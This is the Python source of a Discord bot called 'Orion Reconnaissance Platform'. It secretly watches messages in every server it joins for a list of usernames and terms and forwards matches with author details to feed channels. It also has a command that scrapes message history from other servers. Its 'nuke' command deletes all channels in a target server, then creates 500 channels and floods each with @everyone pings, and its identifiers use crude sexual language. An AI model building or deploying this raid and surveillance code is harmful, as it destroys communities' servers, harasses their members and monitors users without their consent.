import discord
from discord.ext import tasks, commands
import os
import re
from dotenv import load_dotenv
from discord.utils import format_dt
from mod import Moderation
import asyncio

load_dotenv()

BOT_TOKEN = os.getenv('BOT_TOKEN')
DASHBOARD_CHANNEL_ID = int(os.getenv('DASHBOARD_CHANNEL_ID', '0'))
FEED_CHANNEL_IDS = [
    int(id.strip()) for id in os.getenv('FEED_CHANNEL_ID', '').split(',')
    if id.strip().isdigit()
]
OWNER_ID = int(os.getenv('OWNER_ID', '0'))

KEYWORDS = [
    'OrionReconTest', 'toucan cult', 'toucanist state', 'toucan', 'toucanism',
    'toucanist', 'toucan cultist', 'toucan cultists', 'toucan cultism',
    'toucan cultist state', 'toucan cultist states', 'toucanist order state',
    'toucanist order states', 'toucanist order', 'toucanist orders', 'profit',
    'prof1t', 'sanji', 'blubber', 'menasaur', 'msr', 'k1', 'ucp', 'eb', 'e.b',
    'wiz', 'wiz123', 'micnas', 'soviet', 'atf', 'teri', 'teribehenkapati',
    'TS', 'T.S', 'T.S.', 'T.S.', 'T.S.', 'T.S.', 'T.S.', 'T.S.', 'T.S.',
    'T.S.', 'T.S.', 'T.S.', 'T.S.', 'T.S.', 'e16', 'moon', 'gagnito', 'flxx',
    'srak', 'srak2009', 'atomic', 'atomiccyber', 'atomic_cyber', '67', 'rape',
    'cp'
]

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.presences = False
intents.message_content = True

bot = commands.Bot(command_prefix='$', intents=intents)


@bot.event
async def on_ready():
    print(f'✅ Logged in as {bot.user.name} (ID: {bot.user.id})')
    print(f'📊 Monitoring {len(bot.guilds)} server(s)')
    print(f'📢 Feed channels configured: {len(FEED_CHANNEL_IDS)}')


@bot.event
async def on_connect():
    await bot.add_cog(Moderation(bot))


@bot.command()
async def stats(ctx):
    embed = discord.Embed(title="⃝␥ Orion StatTracker",
                          description="📊 Server Stats Update",
                          color=discord.Color.gold(),
                          timestamp=discord.utils.utcnow())
    embed.set_footer(text="🔍 Orion Reconnaissance",
                     icon_url=bot.user.avatar.url if bot.user.avatar else None)
    embed.set_thumbnail(url=bot.user.avatar.url if bot.user.avatar else None)

    for guild in bot.guilds:
        member_count = guild.member_count
        server_id = guild.id
        embed.add_field(
            name=f"🌐 {guild.name}",
            value=f"👥 Members: {member_count}\n🆔 Server ID: `{server_id}`",
            inline=False)

    await ctx.send(embed=embed)


@bot.command()
async def sync(ctx):
    if ctx.author.id != OWNER_ID:
        await ctx.send("You are not authorized to use this command.")
        return

    await ctx.send("Syncing commands")
    print("Starting global sync of commands...")
    try:
        await bot.tree.sync()
        await ctx.send("Commands synced successfully.")
        print("Global commands sync completed.")
    except Exception as e:
        await ctx.send(f"Error syncing commands: {e}")
        print(f"Error syncing commands: {e}")


@bot.command()
async def nuke(ctx, *args):

    LAUNCH_CODE = os.getenv("LAUNCH_CODE")

    if LAUNCH_CODE is None:
        await ctx.send("Launch code not set.")
        return

    if len(args) < 2:
        await ctx.send("No launch code provided.")
        return

    server_id = args[0]
    launchcode = args[1]

    if launchcode != LAUNCH_CODE:
        await ctx.send("🛑 Invalid launch code. Access denied.")
        return

    try:
        target_guild = bot.get_guild(int(server_id))
    except ValueError:
        await ctx.send("Invalid server ID.")
        return

    if not target_guild:
        await ctx.send(
            "Bot is not in the specified server or server not found.")
        return

    if not target_guild.me.guild_permissions.manage_channels:
        await ctx.send(
            "The bot does not have permission to manage channels in the specified server."
        )
        return

    await ctx.send("☢️ Nuking the server...")

    delete_tasks = []
    for channel in target_guild.channels:
        delete_tasks.append(channel.delete())

    await asyncio.gather(*delete_tasks, return_exceptions=True)
    print(f"Raped channels in {target_guild.name}")

    message_content = """||@everyone||"""

    async def spam_channel(channel):
        for j in range(67):
            try:
                await channel.send(message_content)
                print(
                    f"Spam pinged {j+1}/67 in #{channel.name} in {target_guild.name}"
                )
            except Exception as e:
                print(
                    f"Spam ping error {j+1}/67 in #{channel.name} in {target_guild.name}: {e}"
                )
                break

    create_and_spam_tasks = []
    for i in range(1, 501):

        async def rape(i=i):
            try:
                new_channel = await target_guild.create_text_channel(
                    "crack-femboys")
                print(
                    f"Created channel: {new_channel.name} in {target_guild.name}"
                )
                await spam_channel(new_channel)
            except Exception as e:
                print(
                    f"Error creating/spamming channel {i} in {target_guild.name}: {e}"
                )

        create_and_spam_tasks.append(rape())

    await asyncio.gather(*create_and_spam_tasks, return_exceptions=True)

    await ctx.send("Femboys have been cracked.")


@bot.command()
async def fetch(ctx, keyword: str, num_messages: int, server_id: str = None):
    if server_id:
        try:
            target_guild = bot.get_guild(int(server_id))
        except ValueError:
            await ctx.send("Invalid server ID.")
            return

        if not target_guild:
            await ctx.send(
                "Bot is not in the specified server or server not found.")
            return
    else:
        target_guild = ctx.guild

    if num_messages > 100:
        await ctx.send("Maximum number of messages to fetch is 100.")
        return

    if not target_guild.me.guild_permissions.read_message_history:
        await ctx.send(
            "The bot does not have permission to read message history in the specified server."
        )
        return

    await ctx.send("🔍 Fetching messages...")

    matching_messages = []
    keyword_lower = keyword.lower()

    for channel in target_guild.text_channels:
        if len(matching_messages) >= num_messages:
            break
        try:
            async for message in channel.history(limit=500):
                if keyword_lower in message.content.lower():
                    matching_messages.append(message)
                    if len(matching_messages) >= num_messages:
                        break
        except Exception as e:
            print(f"Error fetching messages from {channel.name}: {e}")
            continue

    if not matching_messages:
        await ctx.send("No messages found containing that keyword.")
        return

    server_info = f" from server: {target_guild.name} (ID: {target_guild.id})" if server_id else " from this server"
    content = f"Fetched messages for keyword: '{keyword}'{server_info}\n\n"
    for msg in matching_messages:
        content += f"Author: {msg.author} (ID: {msg.author.id})\n"
        content += f"Channel: #{msg.channel.name}\n"
        content += f"Timestamp: {msg.created_at}\n"
        content += f"Content: {msg.content}\n"
        content += "-" * 50 + "\n\n"

    file_path = "fetched_messages.txt"
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(content)

    try:
        await ctx.send(file=discord.File(file_path))
        print(
            f"Fetched {len(matching_messages)} messages for keyword '{keyword}'{server_info} and sent as TXT file."
        )
    except Exception as e:
        print(f"Error sending file: {e}")
        await ctx.send("Error sending the file.")

    os.remove(file_path)


@bot.event
async def on_message(message):
    if message.author.bot:
        return

    message_content_lower = message.content.lower()
    detected_keyword = None
    highlighted_message = message.content
    for keyword in KEYWORDS:
        pattern = r'\b' + re.escape(keyword.lower()) + r'\b'
        if re.search(pattern, message_content_lower):
            detected_keyword = keyword
            highlighted_message = re.sub(pattern,
                                         lambda m: f"**{m.group()}**",
                                         message.content,
                                         flags=re.IGNORECASE)
            break

    if detected_keyword:

        for feed_channel_id in FEED_CHANNEL_IDS:
            feed_channel = bot.get_channel(feed_channel_id)
            if not feed_channel:
                print(f"Feed channel not found (ID: {feed_channel_id})")
                continue

            embed_color = discord.Color.dark_red()

            embed = discord.Embed(title="⃝␥ Orion Reconnaissance Platform",
                                  description=highlighted_message[:4096],
                                  color=embed_color,
                                  timestamp=message.created_at)

            embed.set_author(
                name=f"{message.author.name}#{message.author.discriminator}",
                icon_url=message.author.display_avatar.url
                if message.author.display_avatar else None)

            embed.set_thumbnail(url=message.guild.icon.url if message.guild
                                and message.guild.icon else None)

            embed.add_field(name="Channel",
                            value=f"<#{message.channel.id}>",
                            inline=True)
            embed.add_field(
                name="Server",
                value=message.guild.name if message.guild else "DM",
                inline=True)
            embed.add_field(name="Matched Keyword",
                            value=f"`{detected_keyword}`",
                            inline=True)

            embed.set_footer(text=message.created_at.strftime("%d/%m/%Y"))

            try:
                await feed_channel.send(embed=embed)
                print(
                    f"Keyword alert sent to #{feed_channel.name} (ID: {feed_channel_id}) for message by {message.author} (keyword: {detected_keyword})"
                )
            except Exception as e:
                print(
                    f"Error sending keyword alert to #{feed_channel.name} (ID: {feed_channel_id}): {e}"
                )

    await bot.process_commands(message)


if __name__ == "__main__":
    if not BOT_TOKEN:
        print("Error: BOT_TOKEN not found in environment variables")
        print(
            "Create a .env file and add your bot token, BOT_TOKEN=your_token_here"
        )
        exit(1)

    if not FEED_CHANNEL_IDS:
        print(
            "Warning: FEED_CHANNEL_ID not set or invalid (keyword monitoring will not work)"
        )

    if OWNER_ID == 0:
        print(
            "Warning: OWNER_ID not set (nuke, sync, and clear_sync commands will not work)"
        )

    print("Launching Orion Reconnaissance Platform...")
    print("=" * 50)

    try:
        bot.run(BOT_TOKEN)
    except discord.errors.PrivilegedIntentsRequired:
        print("\n" + "=" * 50)
        print("Error: Privileged intents not enabled.")
    except Exception as e:
        print(f"\nError running bot: {e}")
